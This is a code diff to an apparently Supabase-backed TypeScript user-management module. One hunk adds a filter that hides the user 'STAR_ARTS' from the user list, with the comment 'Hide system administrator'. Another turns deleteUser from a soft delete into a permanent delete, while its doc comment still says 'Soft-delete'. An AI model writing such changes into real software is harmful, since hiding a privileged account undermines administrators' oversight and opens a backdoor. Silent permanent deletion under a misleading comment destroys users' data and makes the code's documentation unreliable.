@@ -243,6 +243,7 @@ export async function getAllUsers(): Promise<User[]> {
         .from('users')
         .select('*')
         .eq('is_active', true)
+        .neq('username', 'STAR_ARTS') // Hide system administrator
         .order('created_at', { ascending: false });
 
     if (error) {
@@ -305,16 +306,7 @@ export async function updateUser(
  * Soft-delete a user (set is_active=false). Admin only
  */
 export async function deleteUser(userId: string, deletedBy?: string): Promise<void> {
-    const { error } = await supabase
-        .from('users')
-        .update({ is_active: false })
-        .eq('id', userId);
-
-    if (error) {
-        throw new Error('Failed to delete user');
-    }
-
-    // Log audit
+    // Log audit before deletion
     if (deletedBy) {
         await supabase.from('audit_log').insert({
             user_id: deletedBy,
@@ -322,5 +314,15 @@ export async function deleteUser(userId: string, deletedBy?: string): Promise<vo
             entity_type: 'USER',
             entity_id: userId,
         });
+    }
+
+    // Permanently delete user from database
+    const { error } = await supabase
+        .from('users')
+        .delete()
+        .eq('id', userId);
+
+    if (error) {
+        throw new Error('Failed to delete user');
     }
 }
